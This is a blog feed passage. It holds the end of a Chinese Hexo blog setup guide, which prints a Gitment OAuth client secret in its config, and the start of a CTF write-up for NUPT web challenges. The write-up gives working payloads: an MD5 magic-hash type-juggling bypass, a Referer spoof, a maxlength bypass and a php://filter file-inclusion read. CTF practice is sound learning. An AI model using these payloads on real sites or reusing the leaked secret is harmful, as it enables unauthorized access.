__('symbol.colon') &#125;&#125; <span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">    &#123;&#123; __('post.copyright.license_content', theme.post_copyright.license_url, theme.post_copyright.license) &#125;&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="blog-themes-next-languages-zh-Hans-yml"><a href="#blog-themes-next-languages-zh-Hans-yml" class="headerlink" title="blog\themes\next\languages\zh-Hans.yml"></a>blog\themes\next\languages\zh-Hans.yml</h5><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##部分</span></span><br><span class="line"><span class="attr">post:</span></span><br><span class="line"><span class="attr">  copyright:</span></span><br><span class="line"><span class="attr">      title:</span> <span class="string">本文标题</span></span><br><span class="line"><span class="attr">      author:</span> <span class="string">文章作者</span></span><br><span class="line"><span class="attr">      link:</span> <span class="string">原始链接</span></span><br><span class="line"><span class="attr">      license_title:</span> <span class="string">版权声明</span></span><br><span class="line"><span class="attr">      welcome:</span> <span class="string">'访问 findneo 的个人博客'</span></span><br><span class="line"><span class="attr">      license_content:</span> <span class="string">本文在&lt;i</span> <span class="string">class="fa</span> <span class="string">fa-creative-commons"&gt;&lt;/i&gt;</span></span><br><span class="line">        <span class="string">&lt;a</span> <span class="string">href="%s"</span> <span class="string">rel="external</span> <span class="string">nofollow"</span> <span class="string">target="_blank"&gt;%s&lt;/a&gt;下发布。转载请保留原始链接。</span></span><br></pre></td></tr></table></figure><h4 id="文章模板-blog-scaffolds-post-md"><a href="#文章模板-blog-scaffolds-post-md" class="headerlink" title="文章模板 blog\scaffolds\post.md"></a>文章模板 blog\scaffolds\post.md</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">categories: </span><br><span class="line">tags: []     ###可以直接用tags: [tag1,tag2]代替多行tags</span><br><span class="line">description:     ###当主题配置文件中的excerpt_description开启时，会把这一部分作为文章摘要</span><br><span class="line"></span><br><span class="line">---</span><br></pre></td></tr></table></figure><h3 id="将博客发布到GitHub-page"><a href="#将博客发布到GitHub-page" class="headerlink" title="将博客发布到GitHub page"></a>将博客发布到GitHub page</h3><h4 id="网站内容发布"><a href="#网站内容发布" class="headerlink" title="网站内容发布"></a>网站内容发布</h4><p><a href="https://hexo.io/zh-cn/docs/deployment.html#Git" target="_blank" rel="noopener">官方文档</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">创建GitHub账户，新建username.github.io项目，为git配置ssh</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><h4 id="开发内容与配置文件备份"><a href="#开发内容与配置文件备份" class="headerlink" title="开发内容与配置文件备份"></a>开发内容与配置文件备份</h4><p>由于主题next本身是git项目，所以直接在blog文件夹内git init，然后整个blog文件夹(当然blog/.gitignore已经排除了没用的子文件夹)push到GitHub会发现next文件夹整个是空的。因此要做git库的<a href="http://www.mr-ping.com/post/VGr5DCUqTeYoaody" target="_blank" rel="noopener">嵌套处理</a>，但比较麻烦，而且似乎不适用于这种情况。所以最后我采用在<strong>第一次push前</strong>把blog\themes\next\.git 重命名为 blog\themes\next\now-donot-use.git ，于是blog无法识别到next这个项目，成功地备份了所有配置。将来如果要更新主题，只需重命名回来，然后 git pull ，更新完改回去即可。</p><p>本地调试完成后，只需在git bash里执行<code>./ok [&quot;you commit comment&quot;]</code>即可完成部署和配置备份，ok文件内容如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo d</span><br><span class="line">git add -A</span><br><span class="line">if [ "$1" = "" ]</span><br><span class="line">then</span><br><span class="line">git commit -m "Update."</span><br><span class="line">else</span><br><span class="line">git commit -m "$1"</span><br><span class="line">fi</span><br><span class="line">git push</span><br></pre></td></tr></table></figure><h3 id="emmm-重装系统了"><a href="#emmm-重装系统了" class="headerlink" title="emmm,重装系统了"></a>emmm,重装系统了</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">从头开始，安装git fro windows，配置ssh</span><br><span class="line">git config --global user.name your_name</span><br><span class="line">git config --global user.email your_mail</span><br><span class="line">ssh-keygen -t rsa -b 4096 -C "your_email@example.com"</span><br><span class="line">clip &lt; ~/.ssh/id_rsa.pub</span><br><span class="line">ssh -T git@github.com 验证ssh可用</span><br><span class="line">-------------------------------------</span><br><span class="line">在GitHub新建findneo.github.io</span><br><span class="line">git clone https://github.com/findneo/findneo.github.io.git</span><br><span class="line">cd findneo.github.io</span><br><span class="line">git checkout -b bakeup </span><br><span class="line">新建备份分支并设为默认分支，因为后面只手动操作这个分支，master分支由hexo-deployer-git自动操作 </span><br><span class="line">hexo init tmp</span><br><span class="line">cp -a tmp/* ./</span><br><span class="line">rm -rf tmp</span><br><span class="line">npm install --save hexo-deployer-git</span><br><span class="line">npm install --save hexo-generator-baidu-sitemap</span><br><span class="line">npm install --save hexo-generator-sitemap</span><br><span class="line">npm install --save hexo-generator-searchdb</span><br><span class="line">npm install --save hexo-generator-feed </span><br><span class="line">npm i --save hexo-wordcount</span><br><span class="line">-------------------------------------</span><br><span class="line">在站点配置文件中配置git-deployer为master分支</span><br><span class="line">git add . </span><br><span class="line">git commit -m "..." </span><br><span class="line">git push origin bakeup</span><br><span class="line">hexo d -g</span><br></pre></td></tr></table></figure><p>参考了<a href="https://crazymilk.github.io/2015/12/28/GitHub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/#more" target="_blank" rel="noopener">这位朋友</a>的备份方法，很棒，(๑•̀ㅂ•́)و✧。</p><p>列个软件清单：</p><hr><p>WSL、<a href="http://www.voidtools.com/" target="_blank" rel="noopener">everything</a>、 <a href="https://www.typora.io/#windows" target="_blank" rel="noopener">Typora</a> 、shadow socks、chrome、firefox、notepad++ 、<a href="https://findneo.github.io/2017/10/cmd-surfnet/">一键上网脚本</a>、 sublime、印象笔记、python2/3、git for windows、vmware/kali/win7、AgentRansack、7z、射手影音、SumatraPDF、<del>微软办公系列</del> <a href="http://xianshuhua2.blog.163.com/blog/static/99760751201362854753660/" target="_blank" rel="noopener">WPS Office 2013 个人版</a> 、IObitUninstaller、snipaste</p><p>burpsuite、fiddler、wireshark、nmap、sqlmap、winhex、ziperello、weevely、winhex、御剑、awvs</p><h3 id="添加gitment作为评论系统"><a href="#添加gitment作为评论系统" class="headerlink" title="添加gitment作为评论系统"></a>添加gitment作为评论系统</h3><p>项目介绍:<a href="https://imsun.net/posts/gitment-introduction/" target="_blank" rel="noopener">https://imsun.net/posts/gitment-introduction/</a></p><p>在 <em>findneo.github.io\themes\next\layout_partials\comments.swig</em> 的倒数第二个endif前添加</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;% elseif config.gitment.owner and config.gitment.commentrepo and config.gitment.clientid and config.gitment.clientsecret %&#125;</span><br><span class="line">  &lt;div id=<span class="string">"gitmentContainer"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"https://imsun.github.io/gitment/style/default.css"</span>&gt;</span><br><span class="line">&lt;script src=<span class="string">"https://imsun.github.io/gitment/dist/gitment.browser.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="keyword">var</span> gitment = <span class="keyword">new</span> Gitment(&#123;</span><br><span class="line">  id: <span class="string">'&#123;&#123;page.title&#125;&#125;'</span>,</span><br><span class="line">  owner: <span class="string">'&#123;&#123;config.gitment.owner&#125;&#125;'</span>,</span><br><span class="line">  repo: <span class="string">'&#123;&#123;config.gitment.commentrepo&#125;&#125;'</span>,</span><br><span class="line">  oauth: &#123;</span><br><span class="line">  client_id: <span class="string">'&#123;&#123;config.gitment.clientid&#125;&#125;'</span>,</span><br><span class="line">  client_secret: <span class="string">'&#123;&#123;config.gitment.clientsecret&#125;&#125;'</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br><span class="line">gitment.render(<span class="string">'gitmentContainer'</span>)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>然后在站点配置文件末尾添加</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gitment: </span><br><span class="line">    owner: findneo</span><br><span class="line">    commentrepo: findneo.github.io</span><br><span class="line">    clientid: a3407310dfbeafbfe55a</span><br><span class="line">    clientsecret: ad6c900a0fce4a44b8eeb40e1790ee7c7cc7575d</span><br></pre></td></tr></table></figure><p><strong>需要注意的是每发布一篇文章都需要把该页面初始化一下其他人才可以评论，这是因为评论基于issue，并不是bug</strong></p><h3 id="单独控制每篇文章版权声明"><a href="#单独控制每篇文章版权声明" class="headerlink" title="单独控制每篇文章版权声明"></a>单独控制每篇文章版权声明</h3><p>给 <code>themes\next\layout\_macro\post-copyright.swig</code> 加上控制流程，通过每个post的 front-matter控制，遇到想不加版权声明的文章就在头部加上 <code>notoriginal: true</code> 即可，不影响已有文章。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if not post.notoriginal %&#125;</span><br><span class="line">foo</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h3 id="update-20180510"><a href="#update-20180510" class="headerlink" title="update 20180510"></a>update 20180510</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">https://hexo.io/</span><br><span class="line">https://www.haomwei.com/technology/maupassant-hexo.html</span><br><span class="line">http://leonshi.com/2016/02/01/add-existing-project-to-github/</span><br><span class="line"></span><br><span class="line">cd d:</span><br><span class="line">hexo init myblog</span><br><span class="line">cd myblog</span><br><span class="line">rm themes/landscape/ -rf</span><br><span class="line">git clone https://github.com/tufu9441/maupassant-hexo.git themes/maupassant</span><br><span class="line">npm install hexo-renderer-pug --save</span><br><span class="line">npm install hexo-renderer-sass --save</span><br><span class="line">mv themes\maupassant\.git  themes\maupassant\.git.noneed</span><br><span class="line">git init</span><br><span class="line">edit _config.yml</span><br><span class="line">npm install --save hexo-deployer-git</span><br><span class="line">npm install --save hexo-generator-baidu-sitemap</span><br><span class="line">npm install --save hexo-generator-sitemap</span><br><span class="line">npm install --save hexo-generator-searchdb</span><br><span class="line">npm install --save hexo-generator-feed</span><br><span class="line"></span><br><span class="line">git remote add origin https://github.com/superRaytin/alipay-app-ui.git</span><br><span class="line">git remote -v</span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure><h3 id="update-20181022"><a href="#update-20181022" class="headerlink" title="update 20181022"></a>update 20181022</h3><p>折叠代码块</p><p>参考链接：<a href="https://www.bbsmax.com/A/gAJG9Qv8dZ/" target="_blank" rel="noopener">https://www.bbsmax.com/A/gAJG9Qv8dZ/</a>  </p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>南京邮电大学网络攻防训练平台writeup</title>
      <link href="/170924NuptCTFWP/"/>
      <url>/170924NuptCTFWP/</url>
      
        <content type="html"><![CDATA[<blockquote><p>南邮CTF平台网址：</p><ul><li><a href="http://ctf.nuptsast.com/challenges" target="_blank" rel="noopener">http://ctf.nuptsast.com/challenges</a></li><li><a href="http://ctf.nuptzj.cn/challenges" target="_blank" rel="noopener">http://ctf.nuptzj.cn/challenges</a></li></ul></blockquote><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a><a href="http://chinalover.sinaapp.com/web1/" target="_blank" rel="noopener">签到题</a></h4><p><em>nctf{flag_admiaanaaaaaaaaaaa}</em></p><p>ctrl+u或右键查看源代码即可。在CTF比赛中，代码注释、页面隐藏元素、超链接指向的其他页面、HTTP响应头部都可能隐藏flag或提示信息。在渗透测试中，开发者留下的多余注释和测试页面有时也能提供线索。</p><h4 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a><a href="http://chinalover.sinaapp.com/web19/" target="_blank" rel="noopener">md5 collision</a></h4><p><em>nctf{md5_collision_is_easy}</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$md51 = md5(<span class="string">'QNKCDZO'</span>);</span><br><span class="line">$a = @$_GET[<span class="string">'a'</span>];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line"><span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"nctf&#123;*****************&#125;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"false!!!"</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">"please input a"</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用PHP弱类型，前人发现<em>md5(‘QNKCDZO’)=’0e830400451993494058024219903391’</em>，<em>md5(‘240610708’)=’0e462097431906509019562988736854’</em>，而因为使用松散比较的缘故，<em>var_dump(‘0e830400451993494058024219903391’==’0e462097431906509019562988736854’);</em>值为真，因此访问  <em><a href="http://chinalover.sinaapp.com/web19/?a=240610708" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web19/?a=240610708</a></em> 即可。</p><p>1、在PHP中，@被称为错误控制操作符(<a href="http://php.net/manual/en/language.operators.errorcontrol.php" target="_blank" rel="noopener">error control operator</a>)，前置@符号的表达式产生的任何错误都将被忽略。</p><p>2、1992年发布的MD5算法是一种广泛使用的哈希算法，最初被设计用来作为加密算法，在被证明<a href="https://en.wikipedia.org/wiki/Length_extension_attack" target="_blank" rel="noopener">不安全</a>后只能用来做数据完整性校验。MD5算法为消息产生128位摘要，常表示为32位十六进制串，由[0-9a-e]组成。</p><p>3、PHP的比较操作符主要有两类——松散比较和严格比较，于是就有了equal(==)和Identical(===)两种相等，主要区别在于前者会在比较前根据上下文对操作数进行类型转换(<a href="http://php.net/manual/en/language.types.type-juggling.php" target="_blank" rel="noopener">type juggling</a>)而后者不会。这种juggle总的来说利大于弊，但确实容易<a href="https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf" target="_blank" rel="noopener">玩脱</a>。</p><p>​    此处只谈涉及字符串和数值的松散比较。根据本地实验结合官方文档，我们可以总结出来，这种类型转换的行为关键在于两点，一是判断字符串是否处于数字语境(in a numeric context)，二是如何为处于数字语境的字符串取值。</p><p>​    当操作符为<code>==</code>时，若有一个操作数为<code>int/float</code>或两个操作数<code>is_numeric()</code>均为真，则判断为处于数字语境；当操作符为数字操作符，如<code>+-/*</code>时，则判断为处于数字语境。（此段为实验支持下的个人猜测，未找到依据。）</p><p>​    根据PHP<a href="http://php.net/manual/en/language.types.string.php#language.types.string.conversion" target="_blank" rel="noopener">官方文档</a> ，如果一个字符串被认定处于数字语境，那么它的取值取决于字符串的前面一部分，如果字符串以有效的数字型数据【<a href="http://php.net/manual/en/language.types.string.php#language.types.string.conversion" target="_blank" rel="noopener">Valid numeric data</a> ，正则匹配表达为 <code>\s(\d+\.?\d*|\.\d+)([eE]\d+)?\s</code>，含有[eE]的视为科学计数法】开头，那么字符串取开头部分的数值，否则取0 。实验发现<code>1e</code>也被取值为1而不是0，这有点奇怪 :(</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> $a1=<span class="number">1</span>;         $b1=<span class="string">"1"</span>;        $c1=<span class="string">"1padding"</span>;</span><br><span class="line"> $a2=<span class="number">.1</span>;        $b2=<span class="string">".1"</span>;       $c2=<span class="string">".1padding"</span>;</span><br><span class="line"> $a3=<span class="number">1.</span>;        $b3=<span class="string">"1."</span>;       $c3=<span class="string">"1.padding"</span>;</span><br><span class="line"> $a4=<span class="number">1.1</span>;       $b4=<span class="string">"1.1"</span>;      $c4=<span class="string">"1.1padding"</span>;</span><br><span class="line"> $a5=<span class="number">1.e1</span>;      $b5=<span class="string">"1.e1"</span>;     $c5=<span class="string">"1.e1padding"</span>; </span><br><span class="line"> $a6=<span class="number">.1e1</span>;      $b6=<span class="string">".1e1"</span>;     $c6=<span class="string">".1e1padding"</span>;</span><br><span class="line"> $a7=<span class="number">1.1e1</span>;     $b7=<span class="string">"1.1e1"</span>;    $c7=<span class="string">"1.1e1padding"</span>;</span><br><span class="line"> $a8=<span class="number">1e1</span>;       $b8=<span class="string">"1e1"</span>;      $c8=<span class="string">"1e1padding"</span>;</span><br><span class="line"> var_dump($a8==$b8);<span class="comment">//true</span></span><br><span class="line"> var_dump($a8==$c8);<span class="comment">//true</span></span><br><span class="line"> var_dump($b8==$c8);<span class="comment">//false</span></span><br><span class="line"> var_dump($a8+$b8);<span class="comment">//float(20)</span></span><br><span class="line"> var_dump($a8+$c8);<span class="comment">//float(20)</span></span><br><span class="line"> var_dump($b8+$c8);<span class="comment">//float(20)</span></span><br></pre></td></tr></table></figure><p>4、其他符合<code>/0[eE]\d{30}/</code>的MD5值：</p><table><thead><tr><th style="text-align:left">string(strlen($var))     $var</th><th style="text-align:left">string(strlen(md5($var)))       md5($var)</th></tr></thead><tbody><tr><td style="text-align:left">QNKCDZO</td><td style="text-align:left">0e830400451993494058024219903391</td></tr><tr><td style="text-align:left">s878926199a</td><td style="text-align:left">0e545993274517709034328855841020</td></tr><tr><td style="text-align:left">s155964671a</td><td style="text-align:left">0e342768416822451524974117254469</td></tr><tr><td style="text-align:left">s1502113478a</td><td style="text-align:left">0e861580163291561247404381396064</td></tr><tr><td style="text-align:left">s214587387a</td><td style="text-align:left">0e848240448830537924465865611904</td></tr><tr><td style="text-align:left">s878926199a</td><td style="text-align:left">0e545993274517709034328855841020</td></tr><tr><td style="text-align:left">s1091221200a</td><td style="text-align:left">0e940624217856561557816327384675</td></tr><tr><td style="text-align:left">s1885207154a</td><td style="text-align:left">0e509367213418206700842008763514</td></tr><tr><td style="text-align:left">s1836677006a</td><td style="text-align:left">0e481036490867661113260034900752</td></tr><tr><td style="text-align:left">s1184209335a</td><td style="text-align:left">0e072485820392773389523109082030</td></tr><tr><td style="text-align:left">s1665632922a</td><td style="text-align:left">0e731198061491163073197128363787</td></tr><tr><td style="text-align:left">s532378020a</td><td style="text-align:left">0e220463095855511507588041205815</td></tr><tr><td style="text-align:left">240610708</td><td style="text-align:left">0e462097431906509019562988736854</td></tr></tbody></table><h4 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a><a href="http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php" target="_blank" rel="noopener">签到2</a></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span> /&gt;</span></span><br><span class="line">尚未登录或口令错误</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./index.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>输入框：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">name</span>=<span class="string">"text1"</span> <span class="attr">maxlength</span>=<span class="string">"10"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">请输入口令：zhimakaimen</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"开门"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><em>nctf{follow_me_to_exploit}</em></p><p><em>maxlength=”10”</em> 而口令 <em>zhimakaimen</em> 有11位，数据在前端就会被截断掉。这时有两种做法，一种是在chrome/Firefox浏览器的开发者工具中将 <em>maxlength=”10”</em> 字段修改为 <em>maxlength=”11”</em> 或是更大的值；另一种是使用hackbar或burp直接向 <a href="http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php</a>  post  <em>text1=zhimakaimen</em> 。客户端的行为都是可控的，所以熟悉HTML和JavaScript是重要的。</p><h4 id="这题不是WEB"><a href="#这题不是WEB" class="headerlink" title="这题不是WEB"></a><a href="http://chinalover.sinaapp.com/web2/index.html" target="_blank" rel="noopener">这题不是WEB</a></h4><p><em>nctf{photo_can_also_hid3_msg}</em></p><p>下载图片并用winhex打开，在末尾发现字符串。一个简单的隐写。</p><h4 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a><a href="http://chinalover.sinaapp.com/web3/" target="_blank" rel="noopener">层层递进</a></h4><p><em>nctf{this_is_a_fl4g}</em></p><p>查看源代码，跟随链接，依次访问<code>SO.html</code> -&gt; <code>S0.html</code>-&gt;<code>SO.htm</code> -&gt;<code>S0.htm</code>-&gt;<code>404.html</code> ，在最后一个页面里的注释部分可找到flag。还是查看源代码，细心就会发现异常。</p><h4 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode"></a><a href="http://chinalover.sinaapp.com/web20/aaencode.txt" target="_blank" rel="noopener">AAencode</a></h4><p><em>nctf{javascript_aaencode}</em></p><p>aaencode是一种把js代码编码成日语颜文字的编码方式，使用Unicode编码查看，然后 <a href="http://tool.isex.ren/aadecode" target="_blank" rel="noopener">在线解码</a> 。工具作者颇有幽默感。</p><h4 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a><a href="http://chinalover.sinaapp.com/web8/" target="_blank" rel="noopener">单身二十年</a></h4><p><em>nctf{yougotit_script_now}</em></p><p>访问 <em><a href="http://chinalover.sinaapp.com/web8/search_key.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web8/search_key.php</a></em> 会被重定向到 <em><a href="http://chinalover.sinaapp.com/web8/no_key_is_here_forever.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web8/no_key_is_here_forever.php</a></em>  ，重定向会被浏览器自动处理，burp抓包则可见flag。</p><h4 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a><a href="http://chinalover.sinaapp.com/web22/" target="_blank" rel="noopener">你从哪里来</a></h4><blockquote><p>你是从 google 来的吗？<br>传送门：<a href="http://chinalover.sinaapp.com/web22/" target="_blank" rel="noopener">题目地址</a></p></blockquote><p><em>nctf{http_referer}</em></p><p>给请求加上<code>referer: https://www.google.com</code>即可。从<em><a href="https://github.com/otakekumi/NUPT_Challenges/blob/master/WEB/%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5/index.php" target="_blank" rel="noopener">https://github.com/otakekumi/NUPT_Challenges/blob/master/WEB/%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5/index.php</a></em> 看到源代码可能有点问题。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$referer = $_SERVER[<span class="string">'referer'</span>];</span><br><span class="line"><span class="keyword">if</span> ($referer === <span class="string">"https://www.google.com/ "</span> || $referer === <span class="string">"https://www.google.com"</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"nctf&#123;http_referer&#125;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"are you from google?"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第二行应该是<code>$referer = $_SERVER[&#39;HTTP_REFERER&#39;];</code> ？</p><h4 id="php-decode"><a href="#php-decode" class="headerlink" title="php decode"></a>php decode</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CLsI</span><span class="params">($ZzvSWE)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($ZzvSWE); $i++) &#123;</span><br><span class="line">        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $ZzvSWE;&#125;</span><br><span class="line"><span class="keyword">echo</span> CLsI(<span class="string">"+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="</span>);</span><br></pre></td></tr></table></figure><p><em>nctf{gzip_base64_hhhhhh}</em></p><p>运行代码即可。</p><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a><a href="http://4.chinalover.sinaapp.com/web7/index.php" target="_blank" rel="noopener">文件包含</a></h4><p><em>nctf{edulcni_elif_lacol_si_siht}</em></p><p>使用PHP的<a href="http://php.net/manual/en/wrappers.php.php#wrappers.php.filter" target="_blank" rel="noopener">filter</a>协议读取index.php，即访问 <em><a 